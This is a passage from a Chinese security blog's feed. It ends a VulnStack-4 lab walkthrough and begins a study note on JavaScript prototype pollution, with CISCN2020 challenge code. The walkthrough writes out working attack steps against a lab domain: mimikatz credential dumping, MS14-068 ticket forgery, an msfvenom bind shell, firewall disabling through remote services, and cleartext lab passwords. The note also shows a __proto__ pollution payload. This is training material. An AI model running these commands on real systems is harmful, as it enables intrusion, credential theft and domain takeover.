net share       <span class="token comment"># 查看开启了哪些共享</span>
net share ipc$  <span class="token comment"># 开启ipc共享</span>
net share c$    <span class="token comment"># 开启c盘共享</span>
net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user:<span class="token string">""</span>   <span class="token comment"># 与192.168.xx.xx建立空连接</span>
net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$ <span class="token string">"密码"</span> /user:<span class="token string">"用户名"</span>  <span class="token comment"># 建立c盘共享</span>
<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$<span class="token punctuation">\</span>user    <span class="token comment"># 查看192.168.xx.xx c盘user目录下的文件</span>

<span class="token comment"># 以下命令需要切换到域用户douser执行</span>
net config Workstation   <span class="token comment"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span>
net user                 <span class="token comment"># 查看本机用户列表</span>
net user /domain         <span class="token comment"># 查看域用户</span>
net localgroup administrators   <span class="token comment"># 查看本地管理员组（通常会有域用户）</span>
net view /domain         <span class="token comment"># 查看有几个域</span>
net user 用户名 /domain   <span class="token comment"># 获取指定域用户的信息</span>
net group /domain        <span class="token comment"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span>
net group 组名 /domain    <span class="token comment"># 查看域中某工作组</span>
net group <span class="token string">"domain admins"</span> /domain  <span class="token comment"># 查看域管理员的名字</span>
net group <span class="token string">"domain computers"</span> /domain  <span class="token comment"># 查看域中的其他主机名</span>
net group <span class="token string">"doamin controllers"</span> /domain  <span class="token comment"># 查看域控制器（可能有多台）</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705110427222.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112759516.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112650145.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112722114.png" alt loading="lazy"></p>
<p>由搜集到的信息，我们知道目标win7在demo.com域中，域控为<code>WIN-ENS2VR5TR3N</code>，域管理员为<code>Administrator</code>，<code>ping</code>查看域控<code>ip</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705113022472.png" alt loading="lazy"></p>
<p>在目标机上传mimikatz，抓一下Windows 7的密码，mimikatz要有管理员权限不然无法抓取内存密码，要先模拟个system的令牌才能执行成功</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span>
shell
mimikatz.exe
privilege::debug         <span class="token comment"># 权限提升</span>
sekurlsa::logonpasswords <span class="token comment"># 抓取密码</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705122131380.png" alt loading="lazy"></p>
<p>得到明文密码为<code>Dotest123</code>，接下来可以进行横向移动攻击域控</p>
<p>尝试用<code>ms17_010</code>打域控机</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705133417461.png" alt loading="lazy"></p>
<p>利用失败</p>
<h4 id="ms14-068利用"><a href="#ms14-068利用" class="headerlink" title="ms14-068利用"></a>ms14-068利用</h4><p>漏洞利用前提</p>
<ol>
<li>域控没有打MS14-068的补丁(KB3011780)</li>
<li>拿下一台加入域的计算机</li>
<li>有这台域内计算机的域用户密码和sid</li>
</ol>
<p>使用ms14-068，下载地址：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">upload /home/kali/Desktop/WindowsExploits/MS14-068/MS14-068.exe c:<span class="token punctuation">\</span><span class="token punctuation">\</span>users<span class="token punctuation">\</span><span class="token punctuation">\</span>douser</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134119462.png" alt loading="lazy"></p>
<p>在win7上执行下面一条命令<br>域成员<code>sid</code>在上面<code>mimikatz</code>中获取到了，当然也可以用<code>whoami /user</code> 获取<code>sid</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d <span class="token number">192.168</span>.183.130 -p Dotest123
// ms14-068.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码</code></pre>

<p>成功生成票据文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134511406.png" alt loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>mimikatz.exe
kerberos::purge               <span class="token comment"># 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>
kerberos::list                <span class="token comment"># 查看当前机器凭证</span>
kerberos::ptc TGT_douser@DEMO.com.ccache<span class="token punctuation">(</span>生成的票据文件<span class="token punctuation">)</span>   <span class="token comment"># 将票据注入到内存中</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705134918464.png" alt loading="lazy"></p>
<p>尝试<code>net use</code>登录域控</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N
<span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N<span class="token punctuation">\</span>c$</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135037745.png" alt loading="lazy"></p>
<p>如上图，成功登录域控并列出了域控的c盘目录。此时要想控制域控我们还要在Windows 7上面上传一个<strong>正向</strong>的msf马。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p windows/meterpreter/bind_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.108 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4455</span> -f exe -o bind.exe</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135301027.png" alt loading="lazy"></p>
<p>传到Windows7上，然后用smb文件共享将msf马copy到域控的C盘</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">upload /home/kali/Desktop/bind.exe</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135451397.png" alt loading="lazy"></p>
<p>通过远程在域控上面设置好计划任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">schtasks /create /tn <span class="token string">"test"</span> /tr C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>bind.exe /sc MINUTE /S <span class="token number">192.168</span>.183.130</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705135730932.png" alt loading="lazy"></p>
<p>显示<code>Access is denied</code>，用sc服务来远程执行，设置服务来关闭防火墙</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>
sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start unablefirewall</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140010708.png" alt loading="lazy"></p>
<p>创建服务执行msf马（msf正在监听）</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N create bindshell <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"c:<span class="token entity" title="\b">\b</span>ind.exe"</span>
sc <span class="token punctuation">\</span><span class="token punctuation">\</span>WIN-ENS2VR5TR3N start bindshell</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140424925.png" alt loading="lazy"></p>
<p>msf配置</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140300413.png" alt loading="lazy"></p>
<p>成功上线域控</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705140509486.png" alt loading="lazy"></p>
<p>上传mimikatz抓明文密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">upload /home/kali/Desktop/mimikatz.exe 
shell
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141108130.png" alt loading="lazy"></p>
<p>拿到域管理员密码为<code>Test2008@!</code></p>
<h3 id="寻找敏感文件"><a href="#寻找敏感文件" class="headerlink" title="寻找敏感文件"></a>寻找敏感文件</h3><p>拿下域控后，我们就要寻找开头说的那个域控中的重要文件了。开启域控的远程桌面</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/manage/enable_rdp</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705141301815.png" alt loading="lazy"></p>
<p>登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains4 rdesktop <span class="token number">192.168</span>.183.130
输入账号密码，账号：DEMO<span class="token punctuation">\</span>Administrator 密码：Test2008@<span class="token operator">!</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103344426.png" alt loading="lazy"></p>
<p>传个everything</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706103708452.png" alt loading="lazy"></p>
<p>安装后开启里面的http服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706104015740.png" alt loading="lazy"></p>
<p>kali浏览器走个代理，socks5的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105033678.png" alt loading="lazy"></p>
<p>随后即可访问服务器上的所有文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706105540208.png" alt loading="lazy"></p>
<p>至于啥漂亮国攻击授权报告，靶机上没有这文件，估计是自己加上去的，但目的已达成，开溜~</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript原型链污染漏洞学习</title>
    <url>/posts/45af3b18/</url>
    <content><![CDATA[<p>学点新东西，JavaScript独有的安全问题，JavaScript原型链污染，记笔记</p>
<span id="more"></span>

<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>搬张图，转自：<a href="https://www.zhihu.com/question/34183746">https://www.zhihu.com/question/34183746</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605172359234.png" alt loading="lazy"></p>
<p>JavaScript 只有一种结构：对象。每个实例对象（ object ）都有一个私有属性（称之为 <code>__proto__</code> ）指向它的构造函数的原型对象（<code>prototype</code> ）。该原型对象也有一个自己的原型对象( <code>__proto__</code> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
<p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<ul>
<li>原型：原型是Javascript中继承的基础,Javascript的继承就是基于原型的继承</li>
<li>原型链：原型链是javascript的实现的形式,递归继承原型对象的原型,原型链的顶端是Object的原型。</li>
</ul>
<h4 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h4><p>每个对象都有 <code>__proto__</code> 属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 <code>[[prototype]]</code>，但是 <code>[[prototype]]</code> 是内部属性，我们并不能访问到，所以使用 <code>__proto__</code> 来访问。</p>
<h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>每个函数都有 prototype 属性，除了 <code>Function.prototype.bind()</code>，该属性指向原型。所有的类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</p>
<blockquote>
<p>遵循ECMAScript标准，<code>someObject.[[Prototype]]</code> 符号是用于指向 <code>someObject</code> 的原型。从 ECMAScript 6 开始，<code>[[Prototype]]</code> 可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf"><code>Object.getPrototypeOf()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf"><code>Object.setPrototypeOf()</code></a> 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <code>__proto__</code>。</p>
<p>但它不应该与构造函数 <code>func</code> 的 <code>prototype</code> 属性相混淆。被构造函数创建的实例对象的 <code>[[Prototype]]</code> 指向 <code>func</code> 的 <code>prototype</code> 属性。<strong><code>Object.prototype</code></strong> 属性表示 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> 的原型对象。</p>
</blockquote>
<h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><p>首先定义一个函数f</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">f</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 这么写也一样</span>
<span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>我们从一个函数里创建一个对象o，它自身拥有属性a和b的</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;a: 1, b: 2&#125;</span></code></pre>

<p>在f函数的原型上定义属性</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span></code></pre>

<p>不要在 f 函数的原型上直接定义 <code>f.prototype = &#123;b:3,c:4&#125;;</code>这样会直接打破原型链</p>
<p><code>o.[[Prototype]]</code> 有属性 b 和 c， (其实就是 <code>o.__proto__</code> 或者 <code>o.constructor.prototype</code>)</p>
<p><code>o.[[Prototype]].[[Prototype]]</code> 是 <code>Object.prototype</code></p>
<p>最后<code>o.[[Prototype]].[[Prototype]].[[Prototype]]</code>是null</p>
<p>这就是原型链的末尾，即 <code>null</code>，</p>
<p>根据定义，<code>null</code> 就是没有 <code>[[Prototype]]</code>。</p>
<p>综上，整个原型链如下:</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">&#125;</span> <span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token literal-property property">b</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token literal-property property">c</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">&#125;</span> <span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">null</span></code></pre>

<p>a是o的自身属性吗？是的，该属性的值为 1</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span></code></pre>

<p>b是o的自身属性吗？是的，该属性的值为 2</p>
<p>原型上也有一个<code>b</code>属性，但是它不会被访问到。</p>
<p>这种情况被称为<strong>属性遮蔽 (property shadowing)</strong></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span></code></pre>

<p>c是o的自身属性吗？不是，那看看它的原型上有没有</p>
<p>c是<code>o.[[Prototype]]</code>的属性吗？是的，该属性的值为 4</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span></code></pre>

<p>d 是 o 的自身属性吗？不是，那看看它的原型上有没有</p>
<p>d 是 <code>o.[[Prototype]]</code> 的属性吗？不是，那看看它的原型上有没有</p>
<p><code>o.[[Prototype]].[[Prototype]]</code> 为 <code>null</code>，停止搜索</p>
<p>找不到 d 属性，返回 <code>undefined</code></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span></code></pre>

<p>调用对象属性时, 会查找属性，如果本身没有，则会去<code>__proto__</code>中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有<code>__proto__</code>，那么会去<code>__proto__</code>的显式原型中查找，一直到null</p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>这里采用P🐮的例子来简单分析一下</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// foo是一个简单的JavaScript对象</span>
<span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
<span class="token comment">// foo.bar 此时为1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
<span class="token comment">// 修改foo的原型（即Object）</span>
foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span>
<span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
<span class="token comment">// 此时再用Object创建一个空的zoo对象</span>
<span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token comment">// 查看zoo.bar</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605193352763.png" alt loading="lazy"></p>
<p>根据结果我们可以看到，<code>zoo.bar</code>打印出来的是2，foo是一个object实例，我们令<code>foo.__proto__.bar = 2</code>所以实际上是修改了<code>Object</code>这个类，增加了一个属性<code>bar</code>值为2，然后我们有创建了一个object类zoo，则zoo对象自然有一个bar属性</p>
<blockquote>
<p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
</blockquote>
<h3 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h3><ol>
<li>常发生在<code>merge</code> 等对象递归合并操作</li>
<li>对象克隆</li>
<li>路径查找属性然后修改属性的时候</li>
</ol>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span>
<span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 1,2</span>

o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span>  <span class="token comment">// 2</span></code></pre>

<p>这里为什么要用<code>JSON.parse</code>而不直接使用<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code></p>
<p>如果不使用<code>JSON.parse</code>，则原型链并不会被污染，如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210605195054300.png" alt loading="lazy"></p>
<p>因为我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2020-littlegame"><a href="#CISCN2020-littlegame" class="headerlink" title="CISCN2020 littlegame"></a>CISCN2020 littlegame</h4><p>2020年的国赛题，当时保存了一份题目源码，于是这里拿出来复现一下</p>
<p>index.js</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> setFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token constant">COMMODITY</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"sword"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Gold"</span><span class="token operator">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span> <span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"50"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token comment">// Times have changed</span>
    <span class="token string-property property">"gun"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Gold"</span><span class="token operator">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span> <span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"200"</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> <span class="token constant">MOBS</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"Lv1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string-property property">"Lv2"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string-property property">"Lv3"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">"Firepower"</span><span class="token operator">:</span> <span class="token string">"10"</span><span class="token punctuation">,</span> <span class="token string-property property">"Bounty"</span><span class="token operator">:</span> <span class="token string">"15"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
